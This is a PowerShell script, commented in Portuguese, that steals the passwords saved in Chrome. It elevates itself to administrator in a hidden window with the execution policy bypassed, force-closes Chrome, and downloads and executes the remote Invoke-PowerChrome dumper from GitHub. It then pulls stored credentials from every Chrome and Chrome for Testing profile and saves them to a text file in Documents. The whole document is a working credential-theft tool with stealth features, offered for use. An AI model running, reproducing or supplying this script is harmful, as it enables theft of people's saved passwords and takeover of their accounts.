# ExtrairSenhas.ps1 - Versão SUPER SIMPLIFICADA (apenas o que funciona)

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Força o fechamento do Chrome (importante!)
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3

# Baixa o Invoke-PowerChrome.ps1 modificado
$invokePowerChromePath = "$PSScriptRoot\Invoke-PowerChrome.ps1"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -OutFile $invokePowerChromePath

# Carrega e executa o PowerChrome modificado
. $invokePowerChromePath

$allOutput = New-Object System.Text.StringBuilder

# Tenta com o Chrome padrão
$defaultChromePath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default"
if (Test-Path $defaultChromePath) {
    Write-Host "[*] Tentando extrair senhas do Chrome padrão..."
    $output = Invoke-PowerChrome -Browser Chrome -ProfilePath $defaultChromePath -Verbose 2>&1
    [void]$allOutput.AppendLine($output)
} else {
    Write-Host "[-] Caminho do Chrome padrão não encontrado: $defaultChromePath"
    [void]$allOutput.AppendLine("[-] Caminho do Chrome padrão não encontrado: $defaultChromePath")
}

# Tenta com Chrome for Testing (CFT)
$cftPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default"
if (Test-Path $cftPath) {
    Write-Host "[*] Tentando extrair senhas do Chrome for Testing (CFT)..."
    $output = Invoke-PowerChrome -Browser CFT -ProfilePath $cftPath -Verbose 2>&1
    [void]$allOutput.AppendLine($output)
} else {
    Write-Host "[-] Caminho do Chrome for Testing (CFT) não encontrado: $cftPath"
    [void]$allOutput.AppendLine("[-] Caminho do Chrome for Testing (CFT) não encontrado: $cftPath")
}

# Itera por outros perfis do Chrome
$chromeUserDataRoot = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
if (Test-Path $chromeUserDataRoot) {
    $profiles = Get-ChildItem -Path $chromeUserDataRoot -Directory | Where-Object { $_.Name -ne "Default" -and (Test-Path (Join-Path $_.FullName "Login Data")) }
    foreach ($profile in $profiles) {
        $profilePath = $profile.FullName
        Write-Host "[*] Tentando perfil do Chrome: $($profile.Name) em $profilePath..."
        $output = Invoke-PowerChrome -Browser Chrome -ProfilePath $profilePath -Verbose 2>&1
        [void]$allOutput.AppendLine($output)
    }
} else {
    Write-Host "[-] Diretório de dados de usuário do Chrome não encontrado: $chromeUserDataRoot"
    [void]$allOutput.AppendLine("[-] Diretório de dados de usuário do Chrome não encontrado: $chromeUserDataRoot")
}

# Salva (mesmo que tenha erros, salva tudo para diagnóstico)
$allOutput.ToString() | Out-File -FilePath $arquivoSaida -Encoding UTF8

Write-Host "Processo concluído. Arquivo salvo em: $arquivoSaida"
Start-Sleep -Seconds 2
exit
